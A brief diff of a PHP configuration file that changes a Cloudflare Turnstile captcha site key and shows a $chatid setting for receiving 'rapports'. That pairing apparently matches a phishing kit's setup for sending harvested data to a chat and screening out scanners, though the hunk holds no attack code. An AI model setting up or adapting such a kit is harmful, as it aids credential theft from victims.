@@ -52,7 +52,7 @@ $chatid = "CHAT ID"; // Your ChatID To Receive Rapports
 
 $captcha = [
     "activation" => true,
-    "site_key" => "0x4AAAAAABed2PhwS3py0pxx" // Cloudflare Turnstile Key [REQUIRED]
+    "site_key" => "0x4AAAAAABfBoDtIj8JiK69f" // Cloudflare Turnstile Key [REQUIRED]
 ];
 
 
